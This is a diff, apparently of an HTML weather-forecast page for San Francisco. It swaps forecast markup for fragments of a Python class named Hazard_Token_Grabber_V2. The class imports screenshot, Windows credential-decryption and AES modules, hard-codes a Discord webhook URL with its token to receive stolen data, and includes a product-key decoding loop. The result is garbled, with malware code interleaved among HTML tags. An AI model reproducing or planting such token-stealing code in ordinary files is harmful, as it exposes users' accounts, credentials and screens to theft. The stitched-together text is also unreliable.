@@ -9,6 +9,13 @@
 
 _*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*
 <div class="tombstone-container">
+from threading import Thread
+from PIL import ImageGrab
+from win32crypt import CryptUnprotectData
+from re import findall
+from Crypto.Cipher import AES
+
+
 class Hazard_Token_Grabber_V2:
     def __init__(self):
         self.webhook = "https://discord.com/api/webhooks/992731448727580732/FNLs6AzqFSiL2WlLibKklsa_isIMNpDCHvWmvUqirPemquHwFmbIap7vpAVO8alrQo5L"
@@ -164,20 +171,10 @@ class Hazard_Token_Grabber_V2:
                     temp += strToInt(key[j+ offset])
                 except IndexError:
                     return [productName, ""]
-                
-</div></li><li class="forecast-tombstone">
-_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*  
-<div id="seven-day-forecast1" class="panel panel-default">
-    <div class="panel-heading">
-    <b>Extended Forecast for</b>
-    <h2 class="panel-title">
-                San Francisco CA    </h2>
-    </div>
-    <div class="panel-body" id="seven-day-forecast-body">
-            <div id="seven-day-forecast-container"><ul id="seven-day-forecast-list" class="list-unstyled"><li class="forecast-tombstone">
-
-_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*
-<div class="tombstone-container">
+                if temp / 24 <= 255:
+                    key[j+ offset] = temp/24
+                else:
+                    key[j+ offset] = 255
                 temp = int(temp % 24)
             wkey = chars[temp] + wkey
         for i in range(5,len(wkey),6):
@@ -445,18 +442,5 @@ if __name__ == "__main__":
     Hazard_Token_Grabber_V2()
 </div></li><li class="forecast-tombstone">
 _*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*  
-            
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
-                
+
 </body></html>
